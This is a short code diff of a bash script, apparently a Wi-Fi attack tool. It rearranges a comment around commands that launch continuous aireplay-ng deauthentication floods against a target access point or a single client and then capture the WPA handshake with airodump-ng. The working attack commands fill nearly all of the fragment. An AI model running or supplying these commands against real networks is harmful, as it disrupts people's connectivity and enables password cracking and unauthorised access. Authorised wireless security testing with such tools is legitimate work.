@@ -51,10 +51,11 @@ sleep 1
 # Deauthentication Attack
 if [ "$choice" = 1 ]; then
     gnome-terminal -- sudo aireplay-ng --deauth 0 -a "$bssid" "$monitor_interface" &
-    # Capturing Handshake
+    
 elif [ "$choice" = 2 ]; then
     gnome-terminal -- sudo aireplay-ng --deauth 0 -a "$bssid" -c "$devBssid" "$monitor_interface" &
-    # Capturing Handshake
+
 fi
 
+# Capturing Handshake
 sudo airodump-ng -w "$filename" -c "$c" --bssid "$bssid" "$monitor_interface"
